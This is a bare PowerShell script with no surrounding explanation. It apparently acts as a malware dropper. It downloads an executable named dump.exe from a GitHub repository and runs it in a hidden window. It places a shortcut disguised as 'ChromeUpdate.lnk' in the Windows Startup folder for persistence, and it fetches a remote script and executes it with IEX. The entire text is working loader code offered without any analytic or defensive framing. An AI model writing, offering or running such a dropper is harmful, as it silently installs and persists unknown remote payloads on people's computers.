$url2 = "https://github.com/cia168168/folder/raw/main/dump2.exe"
$output2 = "$env:TEMP\dump.exe"
Invoke-WebRequest -Uri $url2 -OutFile $output2
Start-Process -FilePath $output2 -WindowStyle Hidden
$url6 = "https://raw.githubusercontent.com/cia168168/folder/main/Update.ps1"
$output6 = "$env:TEMP\Update.ps1"
Invoke-WebRequest -Uri $url6 -OutFile $output6
$url8 = "https://raw.githubusercontent.com/cia168168/folder/main/ChromeUpdate.lnk"
$output8 = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\ChromeUpdate.lnk"
Invoke-WebRequest -Uri $url8 -OutFile $output8
$url5 = "https://raw.githubusercontent.com/cia168168/folder/main/RUNS.ps1"
$output5 = "$env:TEMP\RUNS.ps1"
Invoke-WebRequest -Uri $url5 -OutFile $output5
IEX (Get-Content $output5 | Out-String)
